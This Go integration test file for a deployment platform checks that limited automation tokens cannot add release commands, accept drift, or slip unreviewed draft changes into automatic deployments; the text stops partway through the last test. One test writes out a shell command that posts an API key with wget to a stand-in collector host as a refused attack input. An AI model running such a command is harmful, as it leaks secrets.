package integration

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json/jsontext"
	"encoding/json/v2"
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	db "github.com/astilbahq/astilba/services/platform/db/generated"
	"github.com/astilbahq/astilba/services/platform/internal/api"
	"github.com/astilbahq/astilba/services/platform/internal/composeproject"
	"github.com/astilbahq/astilba/services/platform/internal/deployment"
	"github.com/astilbahq/astilba/services/platform/internal/domain"
	"github.com/astilbahq/astilba/services/platform/internal/pipeline"
	"github.com/astilbahq/astilba/services/platform/internal/stablejson"
	"github.com/google/uuid"
)

// authorityAgent drives one simulated agent through the real poll and report routes.
type authorityAgent struct {
	t     *testing.T
	f     *fixture
	token string
	in    api.AgentEnrollment
}

// next heartbeats as a real agent does: dispatch treats a server unseen for 45 seconds as offline, and
// polling does not count as being seen.
func (a authorityAgent) next() api.ExecutionCommand {
	a.t.Helper()
	agentRequest(a.t, a.f.server.Client(), a.f.server.URL, "/agent/v1/heartbeat", a.token, api.AgentHeartbeat{Capabilities: a.in.Capabilities, Preflight: a.in.Preflight}, 200, nil)
	var out api.AgentPoll
	agentRequest(a.t, a.f.server.Client(), a.f.server.URL, "/agent/v1/poll", a.token, nil, 200, &out)
	if out.Command == nil {
		a.t.Fatal("expected a command")
	}
	return *out.Command
}

func (a authorityAgent) observe(c api.ExecutionCommand, observation deployment.Observation) {
	a.t.Helper()
	observation.ObservedAt = time.Now()
	if observation.Resources == nil {
		observation.Resources = []deployment.Resource{}
	}
	raw, _ := stablejson.Marshal(observation)
	message := jsontext.Value(raw)
	agentRequest(a.t, a.f.server.Client(), a.f.server.URL, "/agent/v1/report", a.token, api.AgentReport{Id: c.Id, Generation: c.Generation, PlanHash: c.PlanHash, Sequence: 2, State: "succeeded", Steps: []api.ExecutionStep{}, Observation: &message}, 204, nil)
}

func (a authorityAgent) finishPipeline(c api.ExecutionCommand, state api.ExecutionState, result pipeline.Result) {
	a.t.Helper()
	raw, _ := stablejson.Marshal(result)
	message := jsontext.Value(raw)
	agentRequest(a.t, a.f.server.Client(), a.f.server.URL, "/agent/v1/report", a.token, api.AgentReport{Id: c.Id, Generation: c.Generation, PlanHash: c.PlanHash, Sequence: 2, State: state, Steps: []api.ExecutionStep{}, Pipeline: &message}, 204, nil)
}

// applied reports a deploy command finished, with every service in its plan running.
func (a authorityAgent) applied(c api.ExecutionCommand, images map[string]string) deployment.Plan {
	a.t.Helper()
	var payload deployment.Payload
	if c.Kind != "visual" || c.Visual == nil || json.Unmarshal(*c.Visual, &payload) != nil || payload.Action != "deploy" {
		a.t.Fatal("expected a deploy command", c.Kind, payload.Action)
	}
	resources := []deployment.Resource{}
	for _, app := range payload.Plan.Specification.Applications {
		resources = append(resources, deployment.Resource{ID: app.ID, Kind: "service", State: "running", Image: images[app.ID.String()]})
	}
	a.observe(c, deployment.Observation{Applied: true, Resources: resources, StateHash: strings.Repeat("e", 64)})
	return payload.Plan
}

// reviewAndApply is the interactive path: the owner prepares a plan, reads it and applies it.
func (a authorityAgent) reviewAndApply(b *browser, path string, server, revision uuid.UUID, images map[string]string) {
	a.t.Helper()
	var plan deployment.Status
	b.call("POST", path+"/deployment-plans", api.VisualPlanRequest{ServerId: server, BaseRevisionId: revision, AllowHostChanges: true}, 201, &plan)
	a.observe(a.next(), deployment.Observation{Images: images, StateHash: strings.Repeat("f", 64)})
	b.call("POST", path+"/deployment-plans/"+plan.ID.String()+"/apply", api.ApplyPlan{IdempotencyKey: uuid.New()}, 201, nil)
	a.applied(a.next(), images)
}

// expectAutomaticDeploy follows an automatic deployment through its image inspection to the
// deploy command, reports it applied and returns what was deployed.
func (a authorityAgent) expectAutomaticDeploy(images map[string]string) deployment.Plan {
	a.t.Helper()
	c := a.next()
	var payload deployment.Payload
	if c.Kind != "visual" || c.Visual == nil || json.Unmarshal(*c.Visual, &payload) != nil || payload.Action != "resolve" {
		a.t.Fatal("automatic deployment did not start with image review", c.Kind, payload.Action)
	}
	a.observe(c, deployment.Observation{Images: images, StateHash: strings.Repeat("d", 64)})
	return a.applied(a.next(), images)
}

// waitBlocked returns the note of a run's blocked automatic deployment, read from the job history
// an owner sees, once the worker has decided it.
func waitBlocked(t *testing.T, b *browser, path string, run uuid.UUID) string {
	t.Helper()
	deadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(deadline) {
		var runs []struct {
			ID                  uuid.UUID `json:"id"`
			AutomaticDeployment *struct {
				State       string     `json:"state"`
				Note        string     `json:"note"`
				OperationID *uuid.UUID `json:"operationId"`
			} `json:"automaticDeployment"`
		}
		b.call("GET", path+"/builds", nil, 200, &runs)
		for _, r := range runs {
			if r.ID != run || r.AutomaticDeployment == nil {
				continue
			}
			switch r.AutomaticDeployment.State {
			case "blocked":
				if r.AutomaticDeployment.OperationID != nil {
					t.Fatal("a blocked run has a deployment operation")
				}
				return r.AutomaticDeployment.Note
			case "queued":
				t.Fatal("automatic deployment went ahead: " + r.AutomaticDeployment.Note)
			}
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatal("automatic deployment was never decided")
	return ""
}

func expectReviewNote(t *testing.T, note string) {
	t.Helper()
	if !strings.Contains(note, "Prepare and apply a deployment plan") {
		t.Fatalf("block note does not say what to do next: %q", note)
	}
}

// composeEnvironment returns the workspace prefix, a Compose environment and its path.
func composeEnvironment(t *testing.T, f *fixture, b *browser) (uuid.UUID, string, api.Environment, string) {
	t.Helper()
	ws := b.login("owner@example.test", f.password).Workspaces[0].Id
	prefix := "/api/v1/workspaces/" + ws.String()
	var project api.Project
	b.call("POST", prefix+"/projects", map[string]string{"name": "Compose"}, 201, &project)
	var env api.Environment
	b.call("POST", prefix+"/projects/"+project.Id.String()+"/environments", map[string]string{"name": "Files", "configurationOwner": "compose"}, 201, &env)
	return ws, prefix, env, prefix + "/projects/" + project.Id.String() + "/environments/" + env.Id.String()
}

// gitSource is a provider whose branch head the test moves, with signed webhook delivery.
type gitSource struct {
	t          *testing.T
	f          *fixture
	head       atomic.Value
	connection pipeline.Connection
	secret     string
}

func newGitSource(t *testing.T, f *fixture, b *browser, prefix string) *gitSource {
	t.Helper()
	g := &gitSource{t: t, f: f}
	g.head.Store(strings.Repeat("a", 40))
	provider := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if strings.Contains(r.URL.Path, "/branches/") {
			_ = stablejson.Encode(w, map[string]any{"commit": map[string]string{"sha": g.head.Load().(string)}})
			return
		}
		_ = stablejson.Encode(w, map[string]any{"id": 12, "private": false})
	}))
	t.Cleanup(provider.Close)
	var created struct {
		Connection    pipeline.Connection `json:"connection"`
		WebhookSecret string              `json:"webhookSecret"`
	}
	b.call("POST", prefix+"/git-connections", map[string]string{"name": "Source", "provider": "gitea", "baseUrl": provider.URL, "repository": "team/app"}, 201, &created)
	g.connection, g.secret = created.Connection, created.WebhookSecret
	return g
}

func (g *gitSource) push(commit string) {
	g.t.Helper()
	g.head.Store(commit)
	raw, _ := stablejson.Marshal(map[string]any{"ref": "refs/heads/main", "after": commit, "repository": map[string]int{"id": 12}})
	mac := hmac.New(sha256.New, []byte(g.secret))
	mac.Write(raw)
	r, _ := http.NewRequest("POST", g.f.server.URL+"/hooks/git/"+g.connection.ID.String(), bytes.NewReader(raw))
	r.Header.Set("Content-Type", "application/json")
	r.Header.Set("X-Gitea-Event", "push")
	r.Header.Set("X-Gitea-Delivery", uuid.NewString())
	r.Header.Set("X-Gitea-Signature", hex.EncodeToString(mac.Sum(nil)))
	res, err := g.f.server.Client().Do(r)
	if err != nil {
		g.t.Fatal(err)
	}
	res.Body.Close()
	if res.StatusCode != 202 {
		g.t.Fatal("webhook rejected", res.StatusCode)
	}
}

func draftSpec(t *testing.T, b *browser, path string) (api.Revision, domain.Specification) {
	t.Helper()
	var draft api.Revision
	b.call("GET", path+"/draft", nil, 200, &draft)
	var spec domain.Specification
	if err := json.Unmarshal(draft.Specification, &spec); err != nil {
		t.Fatal(err)
	}
	return draft, spec
}

// A deploy-only credential could name its own command to run with the environment's secrets, or
// override the drift refusal, because the plan capability was checked without reading the request.
func TestAutomationPlanNeedsConfigurationForCommandAndDrift(t *testing.T) {
	f := setup(t)
	b, scope, env, path := automationEnvironment(t, f)
	var secret api.SecretVersion
	b.call("POST", path+"/secrets", map[string]string{"name": "API key", "value": "dummy-runtime-canary"}, 201, &secret)
	app := uuid.New()
	image := "busybox:stable"
	spec := domain.Specification{Version: 1, Variables: []domain.Variable{}, Applications: []domain.Application{{ID: app, Name: "Web", Source: domain.ApplicationSource{Kind: "image", Image: &image}, Variables: []domain.Variable{{Name: "API_KEY", SecretVersionID: &secret.Id}}, Health: &domain.HealthCheck{Port: 8080, Path: "/"}}}, Routes: []domain.Route{{ID: uuid.New(), TargetID: app, Protocol: "http", Domain: "releases.example.test", Port: 8080, TLS: "off", AllowCIDRs: []string{}}}}
	var draft api.Revision
	b.call("PUT", path+"/draft", map[string]any{"baseRevisionId": env.DraftRevisionId, "specification": spec}, 200, &draft)
	enrolled, in, agentToken := enrollment(t, f, b, scope.WorkspaceId, "deployment")
	yes := true
	in.Capabilities.Visual, in.Capabilities.SafeReleases = &yes, &yes
	agentRequest(t, f.server.Client(), f.server.URL, "/agent/v1/enroll", "", in, 200, nil)
	agent := authorityAgent{t, f, agentToken, in}
	digest := func(c string) map[string]string {
		return map[string]string{app.String(): "busybox@sha256:" + strings.Repeat(c, 64)}
	}
	running := func(c string, drift bool) []deployment.Resource {
		return []deployment.Resource{{ID: app, Kind: "service", State: "running", Image: digest(c)[app.String()], Drift: drift}}
	}
	agent.reviewAndApply(b, path, enrolled.Server.Id, draft.Id, digest("a"))

	command := []string{"/bin/sh", "-c", "wget -q -O- --post-data=\"$API_KEY\" http://collector.example.test/"}
	withCommand := api.VisualPlanRequest{ServerId: enrolled.Server.Id, BaseRevisionId: draft.Id, ReleaseOptions: &api.ReleaseOptions{Command: command, CommandTimeoutSeconds: 60, DrainSeconds: 10}}
	acceptingDrift := api.VisualPlanRequest{ServerId: enrolled.Server.Id, BaseRevisionId: draft.Id, AcceptDrift: true}

	deployer := *issueAutomation(t, b, path, domain.DeploymentPlan, domain.DeploymentApply).Token
	bearerCall(t, f, deployer, "PUT", path+"/draft", api.DraftUpdate{BaseRevisionId: draft.Id, Specification: draft.Specification}, 403, nil)
	bearerCall(t, f, deployer, "POST", path+"/deployment-plans", withCommand, 403, nil)
	bearerCall(t, f, deployer, "POST", path+"/deployment-plans", acceptingDrift, 403, nil)

	// The same credential still prepares and applies ordinary plans, with its own release budgets.
	var plain deployment.Status
	budgets := api.VisualPlanRequest{ServerId: enrolled.Server.Id, BaseRevisionId: draft.Id, ReleaseOptions: &api.ReleaseOptions{Command: []string{}, CommandTimeoutSeconds: 30, DrainSeconds: 5}}
	bearerCall(t, f, deployer, "POST", path+"/deployment-plans", budgets, 201, &plain)
	agent.observe(agent.next(), deployment.Observation{Images: digest("b"), Resources: running("a", false), StateHash: strings.Repeat("e", 64)})
	bearerCall(t, f, deployer, "GET", path+"/deployment-plans/"+plain.ID.String(), nil, 200, &plain)
	if plain.Plan == nil || plain.Plan.Release == nil || len(plain.Plan.Release.Options.Command) != 0 || plain.Plan.Release.Options.DrainSeconds != 5 {
		t.Fatalf("a plain protected release was lost: %+v", plain)
	}
	bearerCall(t, f, deployer, "POST", path+"/deployment-plans/"+plain.ID.String()+"/apply", api.ApplyPlan{IdempotencyKey: uuid.New()}, 201, nil)
	if delivered := agent.applied(agent.next(), digest("b")); delivered.Release == nil || len(delivered.Release.Options.Command) != 0 {
		t.Fatal("a plain release did not deploy without a command")
	}

	// Without acceptance, reported drift still stops the deployer's plan.
	var refused deployment.Status
	bearerCall(t, f, deployer, "POST", path+"/deployment-plans", api.VisualPlanRequest{ServerId: enrolled.Server.Id, BaseRevisionId: draft.Id}, 201, &refused)
	agent.observe(agent.next(), deployment.Observation{ResourceDrift: true, Images: digest("b"), Resources: running("b", true), StateHash: strings.Repeat("d", 64)})
	bearerCall(t, f, deployer, "GET", path+"/deployment-plans/"+refused.ID.String(), nil, 200, &refused)
	if refused.Plan != nil || refused.State != "failed" {
		t.Fatalf("drift did not stop a plain plan: %+v", refused)
	}

	// Configuration authority covers both, and whoever reviews the plan can see them.
	configurer := *issueAutomation(t, b, path, domain.ConfigurationWrite, domain.DeploymentPlan).Token
	var reviewed deployment.Status
	bearerCall(t, f, configurer, "POST", path+"/deployment-plans", withCommand, 201, &reviewed)
	agent.observe(agent.next(), deployment.Observation{Images: digest("c"), Resources: running("b", false), StateHash: strings.Repeat("d", 64)})
	bearerCall(t, f, configurer, "GET", path+"/deployment-plans/"+reviewed.ID.String(), nil, 200, &reviewed)
	if reviewed.Plan == nil || reviewed.Plan.Release == nil || !slices.Equal(reviewed.Plan.Release.Options.Command, command) {
		t.Fatalf("configuration authority lost the release command: %+v", reviewed)
	}
	driftVisible := func(status deployment.Status) {
		t.Helper()
		if status.Plan == nil || !status.Plan.AcceptDrift || !slices.ContainsFunc(status.Plan.Effects, func(effect string) bool { return strings.Contains(effect, "Accept reported drift") }) {
			t.Fatalf("drift acceptance is missing from plan review: %+v", status)
		}
	}
	var accepted deployment.Status
	bearerCall(t, f, configurer, "POST", path+"/deployment-plans", acceptingDrift, 201, &accepted)
	agent.observe(agent.next(), deployment.Observation{ResourceDrift: true, Images: digest("b"), Resources: running("b", true), StateHash: strings.Repeat("d", 64)})
	bearerCall(t, f, configurer, "GET", path+"/deployment-plans/"+accepted.ID.String(), nil, 200, &accepted)
	driftVisible(accepted)

	// People keep both through their workspace role.
	var owner deployment.Status
	b.call("POST", path+"/deployment-plans", acceptingDrift, 201, &owner)
	agent.observe(agent.next(), deployment.Observation{ResourceDrift: true, Images: digest("b"), Resources: running("b", true), StateHash: strings.Repeat("d", 64)})
	b.call("GET", path+"/deployment-plans/"+owner.ID.String(), nil, 200, &owner)
	driftVisible(owner)
}

// A credential denied every deployment capability could still deploy: it saved a draft and the next
// push planned and applied that whole draft under the owner's policy.
func TestAutomationBuildDeploysOnlyItsOwnImage(t *testing.T) {
	f := setup(t)
	b, scope, env, path := automationEnvironment(t, f)
	source := newGitSource(t, f, b, "/api/v1/workspaces/"+scope.WorkspaceId.String())
	enrolled, in, agentToken := enrollment(t, f, b, scope.WorkspaceId, "combined")
	yes := true
	in.Capabilities.Build, in.Capabilities.BuildControls, in.Capabilities.Visual = &yes, &yes, &yes
	agentRequest(t, f.server.Client(), f.server.URL, "/agent/v1/enroll", "", in, 200, nil)
	agent := authorityAgent{t, f, agentToken, in}
	var secret api.SecretVersion
	b.call("POST", path+"/secrets", map[string]string{"name": "API key", "value": "dummy-runtime-canary"}, 201, &secret)
	app := uuid.New()
	image := pipelineTestImage
	spec := domain.Specification{Version: 1, Applications: []domain.Application{{ID: app, Name: "Worker", Kind: "worker", Source: domain.ApplicationSource{Kind: "image", Image: &image}, Variables: []domain.Variable{{Name: "API_KEY", SecretVersionID: &secret.Id}}}}, Variables: []domain.Variable{}}
	var draft api.Revision
	b.call("PUT", path+"/draft", map[string]any{"baseRevisionId": env.DraftRevisionId, "specification": spec}, 200, &draft)
	cfg := pipeline.BuildConfig{ConnectionID: source.connection.ID, Branch: "main", RunnerID: enrolled.Server.Id, Context: ".", Dockerfile: "Dockerfile", Architecture: "arm64", Arguments: map[string]string{}, Secrets: map[string]uuid.UUID{}, AutoBuild: true, AutoDeploy: true}
	b.call("POST", path+"/builds", map[string]any{"baseRevisionId": draft.Id, "applicationId": app, "requestKey": uuid.New(), "configuration": cfg}, 202, nil)
	agent.finishPipeline(agent.next(), "cancelled", pipeline.Result{})
	images := map[string]string{app.String(): pipelineTestImage}
	agent.reviewAndApply(b, path, enrolled.Server.Id, draft.Id, images)
	images[app.String()] = "sha256:" + strings.Repeat("d", 64)

	build := func(commit string) uuid.UUID {
		t.Helper()
		source.push(commit)
		c := agent.next()
		if c.Kind != "pipeline" {
			t.Fatal("push did not start a build", c.Kind)
		}
		agent.finishPipeline(c, "succeeded", pipeline.Result{Commit: commit, Architecture: "arm64", Image: "astilba-build-" + c.Id.String() + ":built", Digest: "sha256:" + strings.Repeat("d", 64)})
		return c.Id
	}

	// With nothing else in the draft, a push deploys its image with no further step.
	run := build(strings.Repeat("b", 40))
	plan := agent.expectAutomaticDeploy(images)
	if *plan.Specification.Applications[0].Source.ArtifactID != run {
		t.Fatal("automatic deployment did not deploy this run's artifact")
	}

	writer := *issueAutomation(t, b, path, domain.EnvironmentRead, domain.ConfigurationWrite).Token
	var current api.Revision
	bearerCall(t, f, writer, "GET", path+"/draft", nil, 200, &current)
	bearerCall(t, f, writer, "POST", path+"/deployment-plans", api.VisualPlanRequest{BaseRevisionId: current.Id, ServerId: enrolled.Server.Id}, 403, nil)
	var seen domain.Specification
	if err := json.Unmarshal(current.Specification, &seen); err != nil {
		t.Fatal(err)
	}
	injected := uuid.New()
	other := "registry.example.test/dummy/unreviewed:1"
	seen.Applications = append(seen.Applications, domain.Application{ID: injected, Name: "Injected", Kind: "worker", Source: domain.ApplicationSource{Kind: "image", Image: &other}, Variables: []domain.Variable{{Name: "STOLEN", SecretVersionID: &secret.Id}}})
	var saved api.Revision
	bearerCall(t, f, writer, "PUT", path+"/draft", map[string]any{"baseRevisionId": current.Id, "specification": seen}, 200, &saved)

	run = build(strings.Repeat("c", 40))
	expectReviewNote(t, waitBlocked(t, b, path, run))
	var after api.Environment
	b.call("GET", path, nil, 200, &after)
	if after.AppliedRevisionId == nil || *after.AppliedRevisionId != current.Id {
		t.Fatal("a blocked run changed what is applied")
	}
	var requests int
	if err := f.st.Pool.QueryRow(t.Context(), "SELECT count(*) FROM visual_requests WHERE environment_id=$1 AND revision_id NOT IN ($2,$3)", env.Id, draft.Id, current.Id).Scan(&requests); err != nil || requests != 0 {
		t.Fatal("a blocked run prepared a deployment", requests, err)
	}
	reviewable, promoted := draftSpec(t, b, path)
	if len(promoted.Applications) != 2 || *promoted.Applications[0].Source.ArtifactID != run {
		t.Fatal("a blocked run's image did not reach the draft for review")
	}

	// One reviewed deployment takes the saved changes, and automatic deployment resumes.
	images[injected.String()] = "registry.example.test/dummy/unreviewed@sha256:" + strings.Repeat("9", 64)
	agent.reviewAndApply(b, path, enrolled.Server.Id, reviewable.Id, images)
	run = build(strings.Repeat("e", 40))
	plan = agent.expectAutomaticDeploy(images)
	if len(plan.Specification.Applications) != 2 || *plan.Specification.Applications[0].Source.ArtifactID != run {
		t.Fatal("automatic deployment did not resume after review")
	}
}

// A build target on a Compose service changes the image inside a source file, so the comparison has
// to rebuild that same edit from the applied files.
func TestAutomationBuildOnComposeServiceComparesItsEditedFile(t *testing.T) {
	f := setup(t)
	b := f.browser(t)
	ws, prefix, env, path := composeEnvironment(t, f, b)
	source := newGitSource(t, f, b, prefix)
	enrolled, in, agentToken := enrollment(t, f, b, ws, "combined")
	yes := true
	in.Capabilities.Build, in.Capabilities.BuildControls, in.Capabilities.Visual, in.Capabilities.Compose = &yes, &yes, &yes, &yes
	agentRequest(t, f.server.Client(), f.server.URL, "/agent/v1/enroll", "", in, 200, nil)
	agent := authorityAgent{t, f, agentToken, in}
	files := []composeproject.File{{Path: "compose.yaml", Content: "# retained comment\nservices:\n  web:\n    image: " + pipelineTestImage + "\n"}}
	spec := domain.Specification{Version: 1, Applications: []domain.Application{}, Variables: []domain.Variable{}, Compose: &composeproject.Bundle{Namespace: env.DeploymentUnit.Id, Entrypoints: []string{"compose.yaml"}, Files: files}}
	var draft api.Revision
	b.call("PUT", path+"/draft", map[string]any{"baseRevisionId": env.DraftRevisionId, "specification": spec}, 200, &draft)
	var parsed domain.Specification
	if err := json.Unmarshal(draft.Specification, &parsed); err != nil {
		t.Fatal(err)
	}
	app := parsed.Applications[0].ID
	cfg := pipeline.BuildConfig{ConnectionID: source.connection.ID, Branch: "main", RunnerID: enrolled.Server.Id, Context: ".", Dockerfile: "Dockerfile", Architecture: "arm64", Arguments: map[string]string{}, Secrets: map[string]uuid.UUID{}, AutoBuild: true, AutoDeploy: true}
	b.call("POST", path+"/builds", map[string]any{"baseRevisionId": draft.Id, "applicationId": app, "requestKey": uuid.New(), "configuration": cfg}, 202, nil)
	agent.finishPipeline(agent.next(), "cancelled", pipeline.Result{})
	images := map[string]string{app.String(): pipelineTestImage}
	agent.reviewAndApply(b, path, enrolled.Server.Id, draft.Id, images)
	images[app.String()] = "sha256:" + strings.Repeat("d", 64)

	build := func(commit string) uuid.UUID {
		t.Helper()
		source.push(commit)
		c := agent.next()
		agent.finishPipeline(c, "succeeded", pipeline.Result{Commit: commit, Architecture: "arm64", Image: "astilba-build-" + c.Id.String() + ":built", Digest: "sha256:" + strings.Repeat("d", 64)})
		return c.Id
	}
	run := build(strings.Repeat("b", 40))
	plan := agent.expectAutomaticDeploy(images)
	if !strings.Contains(plan.Specification.Compose.Files[0].Content, "astilba-build-"+run.String()) {
		t.Fatal("automatic deployment did not carry this run's image", plan.Specification.Compose.Files[0].Content)
	}

	current, edited := draftSpec(t, b, path)
	edited.Compose.Files[0].Content += "# unreviewed change\n"
	b.call("PUT", path+"/draft", map[string]any{"baseRevisionId": current.Id, "specification": edited}, 200, nil)
	expectReviewNote(t, waitBlocked(t, b, path, build(strings.Repeat("c", 40))))
}

// An imported commit replaces only the source files. Saved runtime settings are not part of what
// the owner's policy covers, even when an owner saved them.
func TestAutomationImportDeploysOnlyItsOwnSource(t *testing.T) {
	f := setup(t)
	b := f.browser(t)
	ws, prefix, env, path := composeEnvironment(t, f, b)
	source := newGitSource(t, f, b, prefix)
	enrolled, in, agentToken := enrollment(t, f, b, ws, "combined")
	yes := true
	in.Capabilities.Build, in.Capabilities.Visual, in.Capabilities.Compose = &yes, &yes, &yes
	agentRequest(t, f.server.Client(), f.server.URL, "/agent/v1/enroll", "", in, 200, nil)
	agent := authorityAgent{t, f, agentToken, in}
	files := func(revision string) []composeproject.File {
		return []composeproject.File{
			{Path: "compose.yaml", Content: "# " + revision + "\nservices:\n  web:\n    image: " + pipelineTestImage + "\n"},
			{Path: "debug.yaml", Content: "services:\n  web:\n    command: [\"/bin/sh\"]\n"},
		}
	}
	var op api.Operation
	b.call("PUT", path+"/source", map[string]any{"baseRevisionId": env.DraftRevisionId, "configuration": pipeline.Source{ConnectionID: source.connection.ID, Branch: "main", RunnerID: enrolled.Server.Id, Paths: []string{"compose.yaml", "debug.yaml"}, Entrypoints: []string{"compose.yaml"}}}, 202, &op)
	agent.finishPipeline(agent.next(), "succeeded", pipeline.Result{Commit: strings.Repeat("a", 40), Files: files("first")})
	draft, spec := draftSpec(t, b, path)
	images := map[string]string{spec.Applications[0].ID.String(): pipelineTestImage}
	agent.reviewAndApply(b, path, enrolled.Server.Id, draft.Id, images)
	b.call("PUT", path+"/source/policy", map[string]bool{"autoDeploy": true}, 204, nil)

	importCommit := func(commit, revision string) uuid.UUID {
		t.Helper()
		source.push(commit)
		c := agent.next()
		if c.Kind != "pipeline" {
			t.Fatal("push did not start an import", c.Kind)
		}
		agent.finishPipeline(c, "succeeded", pipeline.Result{Commit: commit, Files: files(revision)})
		return c.Id
	}

	importCommit(strings.Repeat("b", 40), "second")
	plan := agent.expectAutomaticDeploy(images)
	if !strings.Contains(plan.Specification.Compose.Files[0].Content, "# second") {
		t.Fatal("automatic deployment did not carry the imported source")
	}

	current, edited := draftSpec(t, b, path)
	value := "saved by the owner"
	edited.Variables = append(edited.Variables, domain.Variable{Name: "OWNER_SETTING", Value: &value})
	b.call("PUT", path+"/draft", map[string]any{"baseRevisionId": current.Id, "specification": edited}, 200, nil)

	run := importCommit(strings.Repeat("c", 40), "third")
	expectReviewNote(t, waitBlocked(t, b, path, run))
	reviewable, merged := draftSpec(t, b, path)
	if !strings.Contains(merged.Compose.Files[0].Content, "# third") || len(merged.Variables) != 1 {
		t.Fatal("a blocked import lost its source or the saved variable")
	}

	agent.reviewAndApply(b, path, enrolled.Server.Id, reviewable.Id, images)
	importCommit(strings.Repeat("e", 40), "fourth")
	plan = agent.expectAutomaticDeploy(images)
	if !strings.Contains(plan.Specification.Compose.Files[0].Content, "# fourth") || len(plan.Specification.Variables) != 1 {
		t.Fatal("automatic deployment did not resume after review")
	}

	// Refresh reuses the draft's entrypoints, so a selection saved without changing any file must not
	// pass as part of the commit.
	writer := *issueAutomation(t, b, path, domain.EnvironmentRead, domain.ConfigurationWrite).Token
	current, edited = draftSpec(t, b, path)
	edited.Compose.Entrypoints = []string{"compose.yaml", "debug.yaml"}
	bearerCall(t, f, writer, "PUT", path+"/draft", map[string]any{"baseRevisionId": current.Id, "specification": edited}, 200, nil)
	expectReviewNote(t, waitBlocked(t, b, path, importCommit(strings.Repeat("f", 40), "fifth")))
}

// A push builds each target in turn. A later target admitted while an earlier one's automatic deployment
// was undecided stacked its image on that draft, and neither could then deploy. That deployment has no
// active operation between its passes, so the test holds its job there for longer than a refresh takes.
func TestAutomationBuildsOfOnePushDeployInTurn(t *testing.T) {
	f := setup(t)
	b, scope, env, path := automationEnvironment(t, f)
	source := newGitSource(t, f, b, "/api/v1/workspaces/"+scope.WorkspaceId.String())
	enrolled, in, agentToken := enrollment(t, f, b, scope.WorkspaceId, "combined")
	yes := true
	in.Capabilities.Build, in.Capabilities.BuildControls, in.Capabilities.Visual = &yes, &yes, &yes
	agentRequest(t, f.server.Client(), f.server.URL, "/agent/v1/enroll", "", in, 200, nil)
	agent := authorityAgent{t, f, agentToken, in}
	apps := []uuid.UUID{uuid.New(), uuid.New()}
	image := pipelineTestImage
	spec := domain.Specification{Version: 1, Variables: []domain.Variable{}, Applications: []domain.Application{}}
	for i, app := range apps {
		spec.Applications = append(spec.Applications, domain.Application{ID: app, Name: []string{"First", "Second"}[i], Kind: "worker", Source: domain.ApplicationSource{Kind: "image", Image: &image}})
	}
	var draft api.Revision
	b.call("PUT", path+"/draft", map[string]any{"baseRevisionId": env.DraftRevisionId, "specification": spec}, 200, &draft)
	cfg := pipeline.BuildConfig{ConnectionID: source.connection.ID, Branch: "main", RunnerID: enrolled.Server.Id, Context: ".", Dockerfile: "Dockerfile", Architecture: "arm64", Arguments: map[string]string{}, Secrets: map[string]uuid.UUID{}, AutoBuild: true, AutoDeploy: true}
	for _, app := range apps {
		b.call("POST", path+"/builds", map[string]any{"baseRevisionId": draft.Id, "applicationId": app, "requestKey": uuid.New(), "configuration": cfg}, 202, nil)
		agent.finishPipeline(agent.next(), "cancelled", pipeline.Result{})
	}
	images := map[string]string{apps[0].String(): pipelineTestImage, apps[1].String(): pipelineTestImage}
	agent.reviewAndApply(b, path, enrolled.Server.Id, draft.Id, images)
	digest := "sha256:" + strings.Repeat("d", 64)

	finishBuild := func(commit string) uuid.UUID {
		t.Helper()
		c := agent.next()
		if c.Kind != "pipeline" {
			t.Fatal("expected a build", c.Kind)
		}
		var run pipeline.Command
		if json.Unmarshal(*c.Pipeline, &run) != nil {
			t.Fatal("invalid build command")
		}
		images[run.AppID.String()] = digest
		agent.finishPipeline(c, "succeeded", pipeline.Result{Commit: commit, Architecture: "arm64", Image: "astilba-build-" + c.Id.String() + ":built", Digest: digest})
		return c.Id
	}
	commit := strings.Repeat("b", 40)
	source.push(commit)
	first := finishBuild(commit)
	c := agent.next()
	if c.Kind != "visual" {
		t.Fatal("a second build started before the first deployment", c.Kind)
	}
	const job = "kind='platform_automatic_deployment_v1' AND args->>'id'=$1 AND state IN ('available','scheduled')"
	deadline := time.Now().Add(10 * time.Second)
	for {
		held, err := f.st.Pool.Exec(t.Context(), "UPDATE river_job SET scheduled_at=now()+interval '1 hour' WHERE "+job, first.String())
		if err != nil {
			t.Fatal(err)
		}
		if held.RowsAffected() == 1 {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("the first deployment's job never paused between its passes")
		}
		time.Sleep(10 * time.Millisecond)
	}
	agent.observe(c, deployment.Observation{Images: images, StateHash: strings.Repeat("d", 64)})
	// A job stuck in retries must not stop automatic work for the environment indefinitely.
	aged, err := f.st.Pool.Begin(t.Context())
	if err != nil {
		t.Fatal(err)
	}
	defer aged.Rollback(context.Background())
	if _, err = aged.Exec(t.Context(), "UPDATE pipeline_runs SET created_at=created_at-interval '2 hours' WHERE id=$1", first); err != nil {
		t.Fatal(err)
	}
	if busy, err := db.New(aged).EnvironmentHoldsAutomaticWork(t.Context(), db.EnvironmentHoldsAutomaticWorkParams{WorkspaceID: scope.WorkspaceId, EnvironmentID: env.Id}); err != nil || busy {
		t.Fatal("an old undecided deployment still holds the environment", busy, err)
	}
	if err = aged.Rollback(t.Context()); err != nil {
		t.Fatal(err)
	}
	var idle api.AgentPoll
	agentRequest(t, f.server.Client(), f.server.URL, "/agent/v1/poll", agentToken, nil, 200, &idle)
	if idle.Command != nil {
		t.Fatal("a second build started between the first deployment's operations", idle.Command.Kind)
	}
	if _, err := f.st.Pool.Exec(t.Context(), "UPDATE river_job SET scheduled_at=now() WHERE "+job, first.String()); err != nil {
		t.Fatal(err)
	}
	agent.applied(agent.next(), images)
	second := finishBuild(commit)
	plan := agent.expectAutomaticDeploy(images)
	deployed := []uuid.UUID{}
	for _, app := range plan.Specification.Applications {
		deployed = append(deployed, *app.Source.ArtifactID)
	}
	if !slices.Contains(deployed, first) || !slices.Contains(deployed, second) {
		t.Fatal("one push did not deploy both of its images", deployed)
	}

	// An image a failed deployment left in the draft is not the next run's own change.
	commit = strings.Repeat("c", 40)
	source.push(commit)
	finishBuild(commit)
	c = agent.next()
